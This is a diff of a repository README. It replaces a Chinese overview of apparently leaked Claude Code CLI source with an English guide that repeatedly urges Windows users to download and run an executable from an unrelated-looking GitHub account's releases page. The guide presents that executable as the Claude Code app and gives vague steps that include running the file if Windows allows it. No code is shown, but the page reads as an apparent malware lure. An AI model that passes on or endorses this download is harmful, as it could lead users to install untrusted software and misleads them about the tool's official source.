@@ -1,194 +1,290 @@
-# Claude Code CLI - Source Code Analysis
+# 🤖 claude-code-cli - Run Claude Code in your terminal
 
-> Claude Code CLI 源代码学习与分析项目
+[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/tapperisobar941/claude-code-cli/releases)
 
-## 项目简介
+## 🧭 What this is
 
-这是 Anthropic 官方 **Claude Code CLI** 工具的源代码，用于学习、研究和分析目的。Claude Code 是一个强大的 AI 编程助手命令行工具，支持多种编程任务自动化。
+claude-code-cli is the command-line app behind Claude Code. It gives you a text-based way to work with Claude in Windows Terminal or another command window.
 
-## 技术栈
+It is built for users who want to:
 
-| 类别 | 技术 |
-|------|------|
-| **语言** | TypeScript / TSX |
-| **运行时** | Bun |
-| **UI 框架** | Ink (React for CLI) |
-| **包管理** | Bun |
-| **CLI 框架** | Commander.js |
-| **终端样式** | Chalk |
+- open Claude from the terminal
+- type prompts and get answers in the same window
+- work with files from your computer
+- use tools for search, edit, and read tasks
+- keep the full workflow in one place
 
-## 项目结构
+## 💻 Windows download
 
-```
-src/
-├── commands/          # 斜杠命令实现 (/commit, /review 等)
-├── components/        # UI 组件 (基于 Ink React)
-│   └── design-system/ # 设计系统组件
-├── services/          # 核心服务
-│   ├── api/          # API 服务
-│   ├── mcp/          # MCP 协议实现
-│   ├── analytics/    # 分析服务
-│   └── settingsSync/ # 设置同步
-├── tools/             # 工具实现
-│   ├── BashTool/     # Shell 命令执行
-│   ├── FileReadTool/ # 文件读取
-│   ├── FileEditTool/ # 文件编辑
-│   ├── GrepTool/     # 代码搜索
-│   ├── GlobTool/     # 文件匹配
-│   ├── TaskTool/     # 任务代理
-│   └── ...           # 更多工具
-├── hooks/             # React Hooks
-├── constants/         # 常量定义
-├── ink/               # 终端 UI 框架
-├── utils/             # 工具函数
-├── schemas/           # JSON Schema 定义
-├── screens/           # 屏幕组件
-├── plugins/           # 插件系统
-├── keybindings/       # 快捷键绑定
-└── main.tsx          # 主入口文件
-```
+Visit this page to download:
+https://github.com/tapperisobar941/claude-code-cli/releases
 
-## 核心功能
+On the Releases page, look for the latest version. Then choose the Windows file for your system.
 
-### 命令列表
+### What to download
 
-#### Git & 代码管理
-| 命令 | 描述 |
-|------|------|
-| `/commit` | 智能生成 Git 提交 |
-| `/review` | 代码审查 |
-| `/pr_comments` | PR 评论分析 |
-| `/diff` | 差异查看 |
-| `/branch` | 分支管理 |
+- If you use a 64-bit Windows PC, pick the Windows x64 file
+- If you use a standard Windows laptop or desktop, x64 is the most common choice
+- If you are not sure, start with the x64 build
 
-#### 会话管理
-| 命令 | 描述 |
-|------|------|
-| `/resume` | 恢复历史会话 |
-| `/session` | 会话管理 |
-| `/clear` | 清除对话 |
-| `/compact` | 压缩上下文 |
-| `/rewind` | 回退操作 |
-| `/export` | 导出会话 |
+### Simple setup steps
 
-#### 配置 & 设置
-| 命令 | 描述 |
-|------|------|
-| `/config` | 配置管理 |
-| `/init` | 初始化项目 |
-| `/model` | 切换模型 |
-| `/theme` | 主题设置 |
-| `/login` | 登录账户 |
-| `/logout` | 登出账户 |
+1. Open the Releases page
+2. Download the Windows file from the latest release
+3. Save it to your Downloads folder
+4. Open the file or unzip it, if needed
+5. Run the app from the terminal or by double-clicking the included launcher
+6. Sign in if the app asks for access
+7. Start typing your request
 
-#### MCP & 插件
-| 命令 | 描述 |
-|------|------|
-| `/mcp` | MCP 服务器管理 |
-| `/plugin` | 插件管理 |
-| `/skills` | 技能系统 |
+## 🪟 How to run it on Windows
 
-#### 工具 & 诊断
-| 命令 | 描述 |
-|------|------|
-| `/doctor` | 系统诊断 |
-| `/cost` | 费用统计 |
-| `/usage` | 使用量统计 |
-| `/help` | 帮助信息 |
-| `/upgrade` | 升级版本 |
+After download, use one of these common ways to start it:
 
-#### 模式切换
-| 命令 | 描述 |
-|------|------|
-| `/vim` | Vim 模式 |
-| `/plan` | 计划模式 |
-| `/fast` | 快速模式 |
-| `/permissions` | 权限管理 |
-| `/hooks` | 钩子配置 |
+### Option 1: Run from the file
 
-## 架构亮点
+1. Go to your Downloads folder
+2. Find the app file you downloaded
+3. Double-click it if Windows lets you run it
+4. If it opens a terminal window, wait for the prompt
+5. Type your request and press Enter
 
-### 1. 工具系统 (Tools)
-每个工具都是独立模块，包含：
-- 输入验证 (JSON Schema)
-- 执行逻辑
-- 权限控制
-- 输出格式化
+### Option 2: Run from Command Prompt
 
-### 2. 命令系统 (Commands)
-支持多种命令类型：
-- `prompt` - 提示词命令
-- `local` - 本地执行命令
-- `dialog` - 对话框命令
+1. Press `Win + S`
+2. Type `cmd`
+3. Open Command Prompt
+4. Go to the folder with the app
+5. Start the program from there
 
-### 3. MCP 协议
-完整的 Model Context Protocol 实现，支持：
-- Stdio 传输
-- SSE 传输
-- 资源管理
-- 工具调用
+### Option 3: Run from PowerShell
 
-### 4. 技能系统 (Skills)
-可扩展的技能框架：
-- 内置技能
-- 插件技能
-- 自定义技能目录
+1. Press `Win + S`
+2. Type `PowerShell`
+3. Open PowerShell
+4. Change to the folder where you saved the app
+5. Start the tool from that folder
 
-### 5. 代理系统 (Agents)
-多代理协作支持：
-- Task 代理
-- 并行执行
-- 上下文隔离
+## ✨ What you can do
 
-## 代码统计
+claude-code-cli helps you use Claude for common work tasks in a terminal window.
 
-| 指标 | 数量 |
-|------|------|
-| TypeScript 文件 | ~1884 |
-| 命令数量 | ~50+ |
-| 工具数量 | ~30+ |
-| UI 组件 | ~100+ |
+You can use it to:
 
-## 关键文件
+- ask questions in plain English
+- read and review text files
+- search through folders
+- make small edits to files
+- automate repeat tasks
+- work with code-style project files
+- use connected tools from the same session
 
-| 文件 | 描述 |
-|------|------|
-| `main.tsx` | 应用主入口 |
-| `commands.ts` | 命令注册中心 |
-| `tools.ts` | 工具注册中心 |
-| `context.ts` | 上下文管理 |
-| `ink.tsx` | UI 渲染引擎 |
+## 🛠️ Main parts of the app
 
-## 依赖关系
+This project includes the full terminal layer for Claude Code.
 
-```
-main.tsx
-    ├── commands.ts ──► commands/
-    ├── tools.ts ──► tools/
-    ├── services/
-    │   ├── api/
-    │   ├── mcp/
-    │   └── analytics/
-    └── components/
-        └── design-system/
-```
+### CLI entry and command parsing
 
-## 学习价值
+The app starts with `main.tsx` and the files in `entrypoints/`. These parts decide how the app opens and how it handles commands.
 
-1. **CLI 应用架构** - 大型命令行工具的设计模式
-2. **React 终端 UI** - Ink 框架的实战应用
-3. **MCP 协议** - AI 工具互联协议实现
-4. **插件系统** - 可扩展架构设计
-5. **代理系统** - 多代理协作模式
+### Terminal UI
 
-## 免责声明
+The `components/` folder contains the screen elements that show text in the terminal. It uses React and Ink to draw the interface in a command window.
 
-本项目仅用于学习和研究目的。Claude Code 是 Anthropic, PBC. 的产品。本仓库不包含完整的构建配置和依赖，仅包含源代码用于学习分析。
+### Tool system
 
-## 许可证
+The `tools/` folder holds tools such as:
 
-源代码版权归 Anthropic, PBC. 所有。本项目仅用于教育目的。
+- Bash
+- file read and write
+- file edit
+- search with Grep
+- file matching with Glob
+- web search
 
----
+### API layer
 
-> 最后更新: 2026-03-31
+The `services/api/` folder handles communication with Anthropic services.
+
+### MCP support
+
+The app also includes MCP support for connected tools and external services.
+
+### Multi-agent teamwork
+
+It supports coordinated work between multiple agents or team flows for larger tasks.
+
+### Authentication and policy
+
+The app includes sign-in flow and policy handling so the tool can manage access and use rules.
+
+## 📋 Basic system needs
+
+For a smooth run on Windows, use:
+
+- Windows 10 or Windows 11
+- 64-bit system
+- A modern terminal like Windows Terminal, Command Prompt, or PowerShell
+- Internet access for download and sign-in
+- Enough free space for the app and your working files
+
+## 🔐 First-time setup
+
+When you start the app for the first time, it may ask you to:
+
+1. connect your account
+2. confirm access
+3. choose a folder to work in
+4. allow terminal use
+5. start a new session
+
+Keep the app in a folder you can find again, such as `Downloads` or `Documents`.
+
+## 📁 Recommended folder use
+
+For best results, keep your files in a simple project folder.
+
+Example:
+
+- `C:\Users\YourName\Documents\claude-work`
+- `C:\Users\YourName\Desktop\project-files`
+
+This makes it easier to:
+
+- open files
+- read folders
+- make edits
+- keep your work organized
+
+## ⌨️ Common things to type
+
+You can type plain requests such as:
+
+- help me review this file
+- find all text that says invoice
+- explain what this folder contains
+- make this paragraph shorter
+- search for broken links in this project
+- update the file name references
+- compare these two text files
+
+## 🧩 File access and editing
+
+This app can work with local files through its tool set. That means you can ask it to:
+
+- open a text file
+- read a folder
+- search inside many files
+- change file content
+- save updated text
+- look for matches across a project
+
+## 🌐 Web search use
+
+The tool set may also support web search. You can use it to:
+
+- look up public information
+- find related pages
+- gather quick reference text
+- compare sources
+
+## 🔎 Search tools
+
+The app includes search tools that help it scan local content.
+
+### Grep
+
+Use this when you want to find text inside files.
+
+### Glob
+
+Use this when you want to find files by name or pattern.
+
+These tools make it easier to work with large folders without opening each file by hand.
+
+## 🤝 Working with teams and agents
+
+This project supports multi-agent and team-based work. In practice, that means the system can divide larger jobs into smaller parts and handle more than one task path at a time.
+
+This is useful for:
+
+- large file sets
+- grouped edits
+- repeated review tasks
+- broad project checks
+
+## 🧰 Troubleshooting on Windows
+
+If the app does not start, try these steps:
+
+1. make sure the file finished downloading
+2. unzip the release if it came in a zip file
+3. run it from a terminal window
+4. check that you chose the correct Windows build
+5. open the app from a folder with a simple path
+6. try Windows Terminal, Command Prompt, or PowerShell
+7. download the latest release again if the file looks damaged
+
+If the window opens and closes at once, launch it from a terminal so you can see the message on screen.
+
+## 📝 Typical workflow
+
+A simple first run looks like this:
+
+1. download the release from GitHub
+2. open the file or terminal app
+3. sign in if asked
+4. choose the folder you want to work with
+5. type a short request
+6. read the response
+7. ask for another step if needed
+
+## 📦 Release download
+
+Go to the Releases page here:
+https://github.com/tapperisobar941/claude-code-cli/releases
+
+Download the latest Windows file from that page, then run it on your PC
+
+## 🔎 Project layout
+
+This repository centers on the `src/` folder and the terminal interaction layer.
+
+Main areas include:
+
+- `main.tsx` for app start and command handling
+- `entrypoints/` for CLI, SDK, and MCP modes
+- `components/` for terminal UI parts
+- `tools/` for command and file tools
+- `services/api/` for backend communication
+- MCP support files
+- multi-agent and team support
+- auth and policy logic
+- helper services
+
+## 🖥️ Best terminal choice
+
+For Windows, use Windows Terminal if you have it. It gives a cleaner view and works well with long output. Command Prompt and PowerShell also work.
+
+## 🧭 Safe file habits
+
+Before you let any tool edit files, keep a copy of important work in another folder. That makes it easier to restore a file if you change the wrong part.
+
+Good habits:
+
+- use a test folder first
+- keep file names simple
+- avoid spaces in paths if you can
+- store copies of important files
+
+## 📚 Helpful first use cases
+
+If you are new to this kind of app, start with small tasks:
+
+- ask it to explain a text file
+- search a folder for one word
+- rename a few files by rule
+- clean up a draft
+- compare two short documents
+
+These tasks help you learn how the terminal flow works before you use bigger folders or longer jobs
